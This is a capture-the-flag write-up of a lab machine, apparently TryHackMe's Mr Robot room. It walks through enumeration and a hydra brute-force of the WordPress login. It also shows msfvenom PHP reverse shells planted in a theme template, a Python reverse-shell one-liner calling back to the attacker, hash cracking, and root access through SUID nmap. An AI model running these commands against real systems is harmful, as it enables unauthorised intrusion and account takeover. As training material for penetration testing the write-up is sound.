# enumeration
## nmap
```console
kali@kali:~$ sudo python3 pymap.py -t 10.10.82.107 
created by gu2rks/kurohat                                                                          
find me here https://github.com/gu2rks                                                             
                                                                                                   
port scanning...                                                                                   
22/tcp  closed ssh                                                                                 
80/tcp  open   http                                                                                
443/tcp open   https                                                                               
Enumerating open ports...                                                                          
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-01 13:56 EDT                                    
Nmap scan report for 10.10.82.107                                                                  
Host is up (0.16s latency).                                                                        
                                                                                                   
PORT    STATE  SERVICE  VERSION                                                                    
22/tcp  closed ssh                                                                                 
80/tcp  open   http     Apache httpd                                                               
|_http-server-header: Apache                                                                       
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Device type: storage-misc|general purpose|broadband router|specialized|WAP|printer
Running (JUST GUESSING): HP embedded (91%), Linux 3.X|4.X|2.6.X (91%), Crestron 2-Series (89%), Asus embedded (87%)
OS CPE: cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 3.10 - 3.13 (91%), OpenWrt 12.09-rc1 Attitude Adjustment (Linux 3.3 - 3.7) (90%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 - 4.6 (90%), Linux 3.2 (90%), Linux 3.2 - 3.5 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   193.82 ms 10.8.0.1
2   193.99 ms 10.10.82.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.33 seconds
```

## port 80
- http://192.168.0.18/prepare -> vid
- http://192.168.0.18/fsociety -> vid
- http://192.168.0.18/inform -> pic news
- http://192.168.0.18/question -> pic quote
- http://192.168.0.18/wakeup -> vid
- http://192.168.0.18/join -> enter email

### robots.txt
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

#### fsocity.dic
I try to check the content of the file, it looks like a word list
```console
kali@kali:~/THM/mrRobot$ wc -l fsocity.dic 
858160 fsocity.dic
```

#### key-1-of-3.txt
key 1

### src code
```html
<!doctype html>
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->
<html class="no-js" lang="">
  <head>
    

    <link rel="stylesheet" href="css/main-600a9791.css">

    <script src="js/vendor/vendor-48ca455c.js"></script>

    <script>var USER_IP='208.185.115.6';var BASE_URL='index.html';var RETURN_URL='index.html';var REDIRECT=false;window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};</script>

  </head>
  <body>
    <!--[if lt IE 9]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    

    <!-- Google Plus confirmation -->
    <div id="app"></div>

    
    <script src="js/s_code.js"></script>
    <script src="js/main-acba06a5.js"></script>
</body>
</html>
```

Line 15 looks interesting



# foothold

## WordPress
So during the enumeration, I stump on some weird thing. So I pressed `back` button to go back the the visited page (http://192.168.0.18/fsociety) and this happen.

[!fsociety](pic/Screenshot%202020-07-01%20at%2020.27.20.png)
that is when I found out that the the web page is hosted on wordpress. Moreover I found the login page.
[!login](pic/Screenshot%202020-07-01%20at%2020.29.45.png)

so the goal is using `hydra` to brute-force the using `fsocity.dic` as wordlist. my gut said that the username is **elliot** eller **mr.robot** since they are the boss is the boss of fsocity

```console
kali@kali:~/THM/mrRobot$ nano users.txt # mr.robot elliot
kali@kali:~/THM/mrRobot$ hydra 10.10.250.6 -L users.txt -P fsocity.dic http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -V -t 64 -I
```

it take really long time so I decide to sort and remove duplicate world in `fsocity.dic` [how to do?](https://www.cyberciti.biz/faq/unix-linux-shell-removing-duplicate-lines/)
```console
kali@kali:~/THM/mrRobot$ sort fsocity.dic | uniq -u > passwd.txt 
kali@kali:~/THM/mrRobot$ wc -l passwd.txt 
10 passwd.txt
```
lmao now we have only 10 password left, let hope that it works otherwise we go back to `fsocity.dic`
```console
kali@kali:~/THM/mrRobot$ hydra 10.10.250.6 -L users.txt -P passwd.txt http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -V -t 64 -I
[80][http-post-form] host: 10.10.250.6   login: elliot   password: PASSWORD
```


options: user [`wpscan`](https://wpscan.org/)  : ```$ hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'```

# get shell

use ```msfvenom``` to crate reverse shell
```console
kali@kali:~/THM/mrRobot$ msfvenom -p php/reverse_php LHOST=<ip>  LPORT=1234 -f raw > shell.php
```

I try to upload the shell but it didnt works
[!nope](pic/Screenshot%202020-07-01%20at%2021.51.16.png)

After some I found this. ```http://<target>/wp-admin/theme-editor.php?```, it allows us to change php files. so I `cat` my shell.php and put in `template 404` 

```console
kali@kali:~/Downloads$ nc -nlvp 1234  # nc and then try to visite a site that not exist on the target website                                              
listening on [any] 1234 ...                                                                        
connect to [10.8.14.151] from (UNKNOWN) [10.10.250.6] 33657                                        
whoami                                                                                             
daemon                                                                                             
pwd                                                                                                
/opt/bitnami/apps/wordpress/htdocs
```

# user 
```
kali@kali:~/Downloads$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.250.6] 33664
ls
admin
audio
blog
css
fsocity.dic
images
index.html
index.php
intro.webm
js
key-1-of-3.txt
license.bk
license.txt
readme.html
robots.txt
sitemap.xml
sitemap.xml.gz
video
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
you-will-never-guess-this-file-name.txt
cat you-will-never-guess-this-file-name.txt
hello there person who found me.
ls /home 
robot
cd /home/robot
ls
key-2-of-3.txt
password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

now go to [crackstation](https://crackstation.net/) and use it crack the hash.
abcdefghijklmnopqrstuvwxyz

seem like the shell which i use is not good, I cant use it to spawn pty shell and so on. let move to ```meterpreter shell```
```console
kali@kali:~/THM/mrRobot$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.8.14.151 LPORT=1234 -f raw > shell.php
kali@kali:~/THM/mrRobot$ cat shell.php # copy and put it in 404 template
```

```console
msf5 exploit(multi/http/struts2_content_type_ognl) > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf5 exploit(multi/handler) > run
```

BUT it keep stucking and didnt works, cth said re-run it and it would works. but it still didnt works for me.


Back to my tcp php shell. my Idea is 
1. get php shell like we did before
2. and then spawn python shell
3. at python shell, spawn pty shell


Let do it
```console
kali@kali:~$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.242.203] 34748
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

another nc listen on 6969 (cth and lucifer weirdness getting in my head)
```console
kali@kali:~$ nc -nvlp 6969
listening on [any] 6969 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.242.203] 49822
/bin/sh: 0: can't access tty; job control turned off
$ su -
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/opt/bitnami/apps/wordpress/htdocs$  whoami
whoami
robot
robot@linux:/opt/bitnami/apps/wordpress/htdocs$ cd
cd
robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
```

# root

```console
robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null
find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
```
so the hint on the was ```nmap```. At the same time, /usr/local/bin/nmap is SUID, lets go for it . Read more about nmap privesc [here](https://pentestlab.blog/category/privilege-escalation/) and [here](https://gtfobins.github.io/gtfobins/nmap/)



```console
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# cd
cd
# ls
ls
key-2-of-3.txt  password.raw-md5
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# file firstboot\_done
file firstboot\_done
firstboot_done: empty 
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```